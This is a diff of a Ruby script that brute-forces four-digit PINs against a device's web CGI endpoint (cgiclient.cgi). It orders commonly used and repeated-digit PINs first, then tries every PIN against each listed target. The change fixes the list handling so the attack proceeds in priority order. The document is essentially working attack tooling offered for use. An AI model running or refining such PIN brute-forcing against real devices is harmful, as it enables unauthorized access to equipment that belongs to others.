@@ -103,26 +103,21 @@ elsif mode.eql?(:range)
   end
 end
 
-_pins = Hash.new
-9999.downto(0).to_a each do |i|
-  _pins[i] = 1
+_pins = Array.new
+9999.downto(0).to_a.each do |i|
+  _pins << sprintf('%04d', i)
 end
 
-prioritized = [1234, 2546, 1739, 9876, 1425, 4152] # commonly used PINs
+prioritized = [1234, 2546, 1739, 9876, 1425, 4152].each.collect { |i| i.to_s } # commonly used PINs
 
 # TODO come up with way to generate patterns - keys that are nearby, incremental/decremental ranges
 
 # commonly used PINs that follow a pattern
 0.upto(9) do |i|
-  prioritized << i * 1111
+  prioritized << sprintf('%04d', i * 1111)
 end
 
-# TODO this is broken, once we delete/add, we change the order.. use a set instead? could go poor man hash style..
-prioritized.each do |p|
-  _pins.delete(p)
-end
-
-pins = [ prioritized, _pins.keys ].flatten # hackery
+pins = [ prioritized, _pins ].flatten.uniq
 
 targets.each do |target|
 
@@ -130,10 +125,7 @@ targets.each do |target|
   url = sprintf('http://%s/cgi-bin/cgiclient.cgi?CGI.RequestProperties=', target)
   puts sprintf('url: [%s]', url)
 
-  pins.each do |i|
-
-    pin = sprintf('%04d', i)
-
+  pins.each do |pin|
     begin
       puts sprintf('  trying pin[%s]', pin)
 
